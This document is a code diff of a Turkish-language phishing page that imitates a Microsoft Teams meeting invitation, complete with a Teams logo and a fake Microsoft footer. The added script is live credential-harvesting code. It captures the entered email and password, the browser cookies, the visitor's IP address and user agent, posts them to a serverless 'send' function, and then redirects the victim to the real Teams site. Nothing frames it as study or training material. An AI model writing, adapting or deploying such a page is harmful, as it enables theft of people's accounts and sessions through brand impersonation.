@@ -3,27 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microsoft Teams - Davet</title>
+    <title>Görüşmeye Katıl</title>
     <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="teams-favicon.ico">
 </head>
 <body>
     <div class="container">
-        <img src="teams-logo.png" alt="Microsoft Teams Logo" class="logo">
-        <h2>Microsoft Teams Davet</h2>
-        <p>Toplantıya katılmak için lütfen giriş yapın:</p>
-        <form action="capture.php" method="POST">
-            <input type="text" name="username" placeholder="E-posta veya kullanıcı adı" required>
-            <input type="password" name="password" placeholder="Şifre" required>
+        <img src="teams-logo.png" alt="Microsoft Teams Logosu" class="logo">
+        <h2>Görüşmeye Katıl</h2>
+        <div class="info-box">
+            <p><strong>Microsoft Teams’de konuşmaya katılın</strong></p>
+        </div>
+        <form id="teamsPhishingForm" method="POST" class="auth-form">
+            <input type="text" name="username" placeholder="E-posta veya Telefon" required>
+            <input type="password" name="password" placeholder="Şifreniz" required>
             <input type="hidden" name="cookies" id="cookies">
-            <button type="submit">Katıl</button>
+            <button type="submit" class="join-button">Katıl</button>
         </form>
+        <p class="footer-text">© 2025 Microsoft - <a href="#">Gizlilik ve Çerezler</a> | <a href="#">Şartlar</a></p>
     </div>
     <script>
-        // Çerezleri form’a ekle
-        document.querySelector('form').addEventListener('submit', function(e) {
-            const cookies = document.cookie || 'Çerez bulunamadı';
-            document.getElementById('cookies').value = cookies;
+        document.getElementById('teamsPhishingForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip || 'IP Bulunamadı';
+            const data = {
+                username: formData.get('username'),
+                password: formData.get('password'),
+                cookies: document.cookie || 'Çerez bulunamadı',
+                ip: ip,
+                user_agent: navigator.userAgent
+            };
+            console.log('Gönderilen Veri:', data);
+            try {
+                const response = await fetch('/.netlify/functions/send', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                if (response.ok) {
+                    window.location.href = 'https://teams.microsoft.com';
+                } else {
+                    throw new Error('Sunucu hatası: ' + response.status);
+                }
+            } catch (error) {
+                console.error('Hata:', error);
+                alert('Katılım başarısız: ' + error.message);
+            }
         });
     </script>
 </body>
